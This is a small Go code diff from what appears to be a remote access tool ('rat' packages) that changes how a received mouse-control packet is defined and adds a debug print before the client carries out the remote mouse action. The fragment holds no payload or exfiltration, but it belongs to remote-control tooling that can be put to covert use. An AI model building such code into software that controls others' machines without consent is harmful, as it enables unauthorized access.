@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"rat/client/screen"
 	"rat/shared/network/header"
 
@@ -8,9 +9,9 @@ import (
 )
 
 type MousePacket struct {
-	MonitorID   int "monitor"
-	MouseButton int "button"
-	Type        int "state"
+	MonitorID   int
+	MouseButton int
+	Type        int
 }
 
 func (packet MousePacket) Header() header.PacketHeader {
@@ -18,6 +19,8 @@ func (packet MousePacket) Header() header.PacketHeader {
 }
 
 func (packet MousePacket) OnReceive() error {
+	fmt.Println("mouse", packet)
+
 	screen.Mouse(packet.MonitorID, packet.MouseButton, packet.Type)
 	return nil
 }
